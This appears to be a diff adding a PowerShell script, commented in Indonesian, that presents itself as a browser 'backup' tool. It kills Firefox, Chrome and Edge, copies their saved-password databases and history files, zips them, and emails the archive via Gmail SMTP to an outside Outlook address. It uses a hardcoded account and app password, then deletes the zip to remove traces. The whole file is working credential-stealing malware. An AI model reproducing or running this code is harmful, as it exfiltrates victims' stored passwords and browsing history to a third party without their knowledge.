@@ -1,0 +1,72 @@
+# Konfigurasi
+$emailFrom = "localrootz1337@gmail.com"
+$emailTo = "igp890@outlook.com"
+$emailSubject = "Backup Hasil"
+
+# Lokasi untuk menyimpan file backup
+$backupDirectory = "$env:USERPROFILE"
+
+# Menutup browser sebelum menjalankan backup
+Stop-Process -Name "firefox" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+
+# Lokasi file yang akan di-zip dan di-backup dengan nama baru
+$fileMappings = @{
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\places.sqlite" = "Firefox_Places.sqlite"
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json" = "Firefox_Logins.json"
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" = "Chrome_History"
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" = "Chrome_LoginData"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" = "Edge_History"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" = "Edge_LoginData"
+    # Tambahkan lokasi file lain yang ingin Anda backup dengan nama baru
+}
+
+# Lokasi file yang akan di-zip dan di-backup
+$filesToBackup = $fileMappings.Keys
+
+# Membuat direktori untuk backup
+New-Item -ItemType Directory -Force -Path $backupDirectory
+
+# Menyaring daftar file dan direktori yang valid
+$validFilesToBackup = $filesToBackup | ForEach-Object {
+    $originalPath = $_
+    $isValid = (Test-Path $originalPath) -or (Test-Path (Join-Path $originalPath "*"))
+    if ($isValid) {
+        $newName = $fileMappings[$originalPath]
+        $newPath = Join-Path $backupDirectory $newName
+        Copy-Item -Path $originalPath -Destination $newPath -Recurse -Force
+        Get-Item -Path $newPath
+    } else {
+        Write-Warning "Path '$originalPath' tidak valid atau tidak ditemukan."
+    }
+}
+
+# Mengompresi file-file yang valid menjadi zip
+if ($null -ne $validFilesToBackup) {
+    $zipFileName = "$backupDirectory\Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+    Compress-Archive -Path $validFilesToBackup.FullName -DestinationPath $zipFileName -Force
+
+    # Mengirim email dengan lampiran zip
+    $smtpServer = "smtp.gmail.com"
+    $smtpUsername = "localrootz1337@gmail.com"
+    $smtpPassword = "cdvh btuh nfef mhtv"
+
+    # Konfigurasi pengaturan SMTP
+    $smtpSettings = @{
+        SmtpServer = $smtpServer
+        Port = 587
+        UseSsl = $true
+        Credential = (New-Object PSCredential -ArgumentList ($smtpUsername, (ConvertTo-SecureString -String $smtpPassword -AsPlainText -Force)))
+    }
+
+    # Mengirim email dengan lampiran zip
+    Send-MailMessage -From $emailFrom -To $emailTo -Subject $emailSubject -Attachments $zipFileName -Body "Backup file terlampir." @smtpSettings
+
+    Write-Host "Backup dan pengiriman email selesai."
+    
+    # Menghapus jejak hasil zip file setelah mengirim email
+    Remove-Item -Path $zipFileName -Force
+} else {
+    Write-Warning "Tidak ada file atau direktori yang valid untuk di-zip."
+}
